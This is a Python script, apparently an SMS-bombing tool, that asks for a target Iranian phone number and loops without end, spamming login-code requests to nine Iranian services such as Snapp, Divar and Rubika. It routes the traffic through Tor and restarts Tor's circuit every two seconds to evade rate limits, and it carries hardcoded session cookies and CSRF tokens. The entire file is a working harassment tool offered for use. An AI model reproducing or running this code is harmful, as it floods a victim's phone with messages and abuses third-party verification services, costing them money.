import os
import time
import requests
from threading import Thread
from colorama import Fore

os_type = os.name

if os_type != 'nt':
    os.system("pkg install python")
    os.system("pip install colorama")
    os.system("pip install requests")
    os.system("clear")
else :
    os.system("pip install colorama")
    os.system("pip install requests")
    os.system("cls")

proxy = {"socks5": "127.0.0.1:9050"}

def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
        if "OK" in snapR.text:
            print (Fore.GREEN + "[+]~>snapR Result = YES :)<~[+]")
        else:
            print (Fore.RED + "[+]~>snapR Result = No!<~[+]")
    except:
        print (Fore.RED +"[+]~>snapR Result = No!<~[+]")

def shad(phone):
    #shad api
    shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD, proxies=proxy)
        if "OK" in shadR.text:
            print (Fore.LIGHTCYAN_EX + "[+]~>Shad Result = YES :)<~[+]")
        else:
            print (Fore.RED + "[+]~>Shad Result = No!<~[+]")
    except:
        print (Fore.RED + "[+]~>Shad Result = No!<~[+]")

def gap(phone):
    #gap api
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH, proxies=proxy)
        if "OK" in gapR.text:
            print (Fore.LIGHTWHITE_EX + "[+]~>gapR Result = YES :)<~[+]")
        else:
            print (Fore.RED + "[+]~>gapR Result = No!<~[+]")
    except:
        print (Fore.RED + "[+]~>gapR Result = No!<~[+]")

def tap30(phone):
    #tap30 api
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D, proxies=proxy)
        if "OK" in tap30R.text:
            print (Fore.LIGHTCYAN_EX + "[+]~>tap30R Result = YES :)<~[+]")
        else:
            print (Fore.RED + "[+]~>tap30R Result = No!<~[+]")
    except:
            print (Fore.RED + "[+]~>tap30R Result = No!<~[+]")

def emtiaz(phone):
    #emtiaz api
    emH = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
    emD = "send=1&cellphone=0"+phone.split("+98")[1]
    try:
        emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD, proxies=proxy)
        print (Fore.LIGHTRED_EX + "[+]~>emR Result = YES :)<~[+]")
    except:
        print (Fore.RED + "[+]~>emR Result = No!<~[+]")

def divar(phone):
    #divar api
    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD, proxies=proxy)
        if "SENT" in divarR.text:
            print (Fore.MAGENTA + "[+]~>Divar Result = YES :)<~[+]")
        else:
            print (Fore.RED + "[+]~>Divar Result = No!<~[+]")
    except:
        print (Fore.RED + "[+]~>Divar Result = No!<~[+]")

def rubika(phone):
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
        if "OK" in ruR.text:
            print (Fore.BLUE + "[+]~>ruR Result = YES :)<~[+]")
        else:
            print (Fore.RED + "[+]~>ruR Result = No!<~[+]")
    except:
        print (Fore.RED + "[+]~>ruR Result = No!<~[+]")

def torob(phone):
    #torob api
    torobH = {"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"}
    try:
        torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH, proxies=proxy)
        if "sent" in torobR.text:
            print (Fore.BLACK + "[+]~>torob Result = YES  :)<~[+]")
        else:
            print (Fore.RED + "[+]~>torob Result = No!<~[+]")
    except:
        print (Fore.RED + "[+]~>torob Result = No!<~[+]")

def bama(phone):
    #bama api
    bamaH = {"authority": "bama.ir","method": "POST","path": "/signin-send-otp","scheme": "https","accept": "application/json, text/javascript, */*; q=0.01","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,fa;q=0.8","content-length": "22","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "__cf_bm=dpfdTuYlw7TCbyGWi4bqMm404f.jQgKWjKlswZRqNkE-1630749094-0-ASFpgeyWkIEaiHCNZpjFg6HvoaCKKFdse8ua169vw5K/KL+fVm9XPkSepMf6YHTLoxENZmecrF/nB6Iy7d+SjEfDPagaU8pkk+Dehh6OrEI44kOrafgPq0iDgLWduZiT2llyKryxIB94lp0JvdZsR9k+CjSOvowRAAM571uM6RgA; __cflb=02DiuFDZJj38KoK7EoAEWmzXoRsWGNYCNVpAriwD2t2s6; _ga=GA1.2.314976238.1630749108; _gid=GA1.2.1461821543.1630749108; _gat_gtag_UA_119698040_4=1; _gat_UA-119698040-4=1; CSRF-TOKEN-BAMA-COOKIE=CfDJ8J1kbi79JwRGrK8gPtbQQY76KnJGEAibnLsGWm9b6IQGXQY7Bqn6hngT1kjB9Z49KyKDM2_NyJRmO3AJVobkUBTvT7s_XQCwSHN9URwNE3-po1-sg2ormefggFAtDGEON_Hl73oyKWXFwEHnb3ILXVU","csrf-token-bama-header": "CfDJ8J1kbi79JwRGrK8gPtbQQY7V0S5EeReRhhpjBoePccND89QJ7HLNBqzJkLpmmW4pgjHoLTwx9lHhC6cxHUGSDYxAQUxhYBchVaZ2LGTQmPAIsn-JFikRSyIy6MZCls3webta3kMfBvbbnGM2pj5OSTA","origin": "https://bama.ir","referer": "https://bama.ir/Signin?ReturnUrl=%2Fprofile","sec-ch-ua": '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',"sec-ch-ua-mobile": "?0","sec-ch-ua-platform": "Windows","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36","x-requested-with": "XMLHttpRequest"}
    bamaD = "cellNumber=0"+phone.split("+98")[1]
    try:
        bamaR = requests.post("https://bama.ir/signin-send-otp", headers=bamaH, data=bamaD, proxies=proxy)
        if "0" in bamaR.text:
            print (Fore.YELLOW + "[+]~>bama Result = Yes  :)<~[+]")
        else:
            print (Fore.RED + "[+]~>bama Result = No!<~[+]")
    except:
        print (Fore.RED + "[+]~>bama Result = No!<~[+]")

def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        time.sleep(0.0)
    print()
SlowPrint(Fore.CYAN + '''

 /$$$$$$$$            /$$$$$$                   
| $$_____/           /$$__  $$                  
| $$        /$$$$$$ | $$  \__//$$$$$$  /$$$$$$$ 
| $$$$$    /$$__  $$| $$$$   |____  $$| $$__  $$
| $$__/   | $$  \__/| $$_/    /$$$$$$$| $$  \ $$
| $$      | $$      | $$     /$$__  $$| $$  | $$
| $$$$$$$$| $$      | $$    |  $$$$$$$| $$  | $$
|________/|__/      |__/     \_______/|__/  |__/
                                                                                                                       
''')

def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        time.sleep(0.1)
    print()
SlowPrint(Fore.RED + '''
dev : www.SirVariable.dev
telegram : @SirVariable
instagram: @SirVariable
''')

def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        time.sleep(0.0)
    print()
SlowPrint(Fore.GREEN + '''

''')

def main():
    phone = str(input(Fore.GREEN + "~> Created By: @SirVariable <~\n\n" + Fore.RED + "Target phone Number --> (+98xxx): "))
    while True:
        Thread(target=snap, args=[phone]).start()
        Thread(target=shad, args=[phone]).start()
        Thread(target=gap, args=[phone]).start()
        Thread(target=tap30, args=[phone]).start()
        Thread(target=emtiaz, args=[phone]).start()
        Thread(target=divar, args=[phone]).start()
        Thread(target=rubika, args=[phone]).start()
        Thread(target=torob, args=[phone]).start()
        Thread(target=bama, args=[phone]).start()
        os.system("killall -HUP tor")
        time.sleep(2)


if __name__ == "__main__":
    main()
